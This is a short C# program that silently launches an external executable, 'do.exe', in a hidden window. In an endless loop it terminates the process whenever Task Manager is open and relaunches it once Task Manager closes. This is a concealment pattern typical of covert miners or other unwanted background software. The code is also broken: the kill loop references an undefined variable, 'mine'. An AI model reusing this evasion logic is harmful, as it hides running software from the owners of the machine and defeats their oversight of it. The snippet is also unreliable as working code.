using System;
using System.Diagnostics;
using System.IO;
using System.Threading;


Process myProcess = new Process();
myProcess.StartInfo.FileName = "cmd.exe";
myProcess.StartInfo.Arguments = $@"/C cd {Directory.GetParent(Directory.GetCurrentDirectory())} & do.exe";
myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
myProcess.StartInfo.CreateNoWindow = true;

search();

void search()
{
    while (true)
    {
        Process[] disp = Process.GetProcessesByName("Taskmgr");
        Process[] doing = Process.GetProcessesByName("do");
        if (disp.Length > 0)
        {
            foreach (Process proc in mine)
            {
                proc.Kill();
                Console.WriteLine("kill " + proc.ProcessName);
                Thread.Sleep(1000);
            }
        }
        else if (doing.Length == 0)
        {
            myProcess.Start();
            Console.WriteLine("Begin");
            Thread.Sleep(1000);
        }
    }
}
